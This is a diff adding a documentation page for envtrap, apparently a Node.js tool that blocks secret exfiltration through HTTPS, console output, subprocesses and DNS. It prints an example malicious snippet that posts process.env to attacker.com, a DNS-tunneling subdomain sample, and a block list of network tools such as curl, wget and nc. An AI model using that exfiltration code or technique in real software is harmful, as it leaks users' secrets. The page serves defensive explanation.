@@ -1,0 +1,144 @@
+---
+title: "Attack Surfaces"
+description: "The five runtime attack surfaces envtrap monitors and blocks to prevent secret exfiltration."
+---
+
+## Overview
+
+envtrap protects against **five distinct exfiltration attack surfaces** that are commonly exploited by malicious npm packages and compromised dependencies:
+
+<CardGroup cols={2}>
+  <Card title="HTTPS Traffic" icon="globe">
+    Outbound HTTP/S requests carrying secrets in headers or body
+  </Card>
+  <Card title="stdout / stderr" icon="terminal">
+    Secrets written to console output and log streams
+  </Card>
+  <Card title="Subprocesses" icon="code-branch">
+    Unauthorized child processes (curl, wget, nc) spawned to exfiltrate data
+  </Card>
+  <Card title="DNS Tunneling" icon="network-wired">
+    Data encoded in DNS subdomain queries to bypass HTTP monitoring
+  </Card>
+  <Card title="Entropy Detection" icon="chart-bar">
+    Statistical detection of high-entropy strings in all channels
+  </Card>
+</CardGroup>
+
+---
+
+## 1. HTTPS Traffic
+
+**Why it's a risk**: Almost all npm packages make outbound HTTPS calls for telemetry, updates, or their core functionality. A malicious package simply sends your `process.env` to an attacker server using `https.request`.
+
+**What envtrap does**:
+- Intercepts every `https.request` and `http.request` call
+- Inspects request URL, headers, and body
+- Checks against domain allow-list
+- Scans body for secret patterns
+
+**Example attack blocked**:
+```javascript
+// Malicious code inside node_modules/evil-package/index.js
+const https = require('https');
+https.request({
+  hostname: 'attacker.com',
+  path: '/collect',
+  method: 'POST',
+  body: JSON.stringify(process.env)  // All your secrets!
+});
+```
+
+```
+BLOCKED | Channel: HTTPS | Secret: STRIPE_SECRET_KEY
+Destination: attacker.com | Action: Request terminated
+```
+
+---
+
+## 2. stdout / stderr
+
+**Why it's a risk**: Logging libraries, debug statements, and error handlers frequently serialize the full environment or request objects — leaking secrets into log streams that may be stored or transmitted.
+
+**What envtrap does**:
+- Wraps `process.stdout.write` and `process.stderr.write`
+- Scans each write for secret patterns before output
+- Redacts matched values: `[REDACTED:ENVTRAP]`
+
+**Example**:
+```javascript
+console.log('Request failed:', { headers, body });
+// headers.Authorization = "Bearer sk_live_..."
+// → stdout gets: "Bearer [REDACTED:ENVTRAP]"
+```
+
+---
+
+## 3. Subprocesses
+
+**Why it's a risk**: `child_process.exec` can spawn `curl`, `wget`, or `bash` with environment variables that carry secrets — completely bypassing Node.js-level HTTPS monitoring.
+
+**What envtrap does**:
+- Patches `exec`, `execSync`, `spawn`, `spawnSync`, `fork`
+- Validates the command against an **subprocess allow-list**
+- Blocks unauthorized commands before any OS-level fork
+
+**Default blocked commands**: `curl`, `wget`, `nc`, `ncat`, `python`, `ruby`, `perl`, `bash -c`, `sh -c` (when used for network access)
+
+**Configuration**:
+```json
+{
+  "channels": {
+    "subprocess": {
+      "mode": "block",
+      "allowList": ["git", "node", "pnpm", "npm"]
+    }
+  }
+}
+```
+
+---
+
+## 4. DNS Tunneling
+
+**Why it's a risk**: DNS queries bypass most HTTP-level firewalls. Attackers encode data in subdomain labels (e.g., `c3RyaXBlX3NlY3JldA==.attacker.com`) to exfiltrate data without making a single HTTP connection.
+
+**What envtrap does**:
+- Intercepts all `dns.resolve` calls and raw UDP DNS packets
+- Checks subdomain labels for base64, hex, and high-entropy patterns
+- Detects abnormally long subdomains (indicator of encoded data)
+- Blocks queries that match exfiltration signatures
+
+**Detection heuristics**:
+
+| Signal | Threshold |
+|---|---|
+| Subdomain label length | > 40 characters |
+| Label entropy | > 4.5 bits/char |
+| Base64 pattern in label | Always flagged |
+| Number of labels | > 6 |
+
+---
+
+## 5. Entropy Detection
+
+**Why it's a risk**: Custom credentials, encryption keys, and randomly generated tokens don't match known regex patterns but are still sensitive.
+
+**What envtrap does**:
+- Applies Shannon entropy scoring to all intercepted strings
+- Flags strings above the configured threshold (default: 5.0)
+- Works across all channels (HTTPS body, stdout, DNS, subprocess args)
+
+See the [Secret Detection](/how-it-works/secret-detection) page for full details on the entropy algorithm and configuration.
+
+---
+
+## Attack Surface Matrix
+
+| Attack Surface | Pattern Match | Entropy Scan | Domain Allow-list | Subprocess Allow-list |
+|---|---|---|---|---|
+| HTTPS body | ✅ | ✅ | ✅ | — |
+| HTTPS headers | ✅ | ✅ | ✅ | — |
+| stdout / stderr | ✅ | ✅ | — | — |
+| Subprocess args | ✅ | ✅ | — | ✅ |
+| DNS queries | ✅ | ✅ | — | — |
